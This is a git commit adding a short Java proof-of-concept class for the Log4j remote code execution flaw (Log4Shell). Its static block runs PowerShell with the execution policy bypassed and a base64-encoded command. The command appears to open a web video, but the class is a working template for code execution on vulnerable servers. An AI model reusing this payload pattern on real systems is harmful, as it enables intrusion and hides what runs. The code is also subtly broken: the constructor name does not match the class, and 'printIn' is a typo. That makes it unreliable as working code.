074f203bbac2bb65e4c21c4609284242b529d4c0
Jose Tzunun <75795429+josetzunun@users.noreply.github.com>
2021-12-26 13:30:59 -0500

    Create Log4jRCE.java

---
+++ poc/Log4jRCE.java
@@ -0,0 +1,15 @@
+public class Log4jRCE {
+
+    static {
+    
+        try {
+            java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc cwB0AGEAcgB0ACAAYwBoAHIAbwBtAGUAIABoAHQAdABwAHMAOgAvAC8AeQBvAHUAdAB1AC4AYgBlAC8AZABRAHcANAB3ADkAVwBnAFgAYwBRACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABtAGEAeABpAG0AaQB6AGUAZAANAAoA").waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    public Log4RCE(){
+        System.out.printIn("I am Log4jRCE from remote222!!!");
+    }
+}
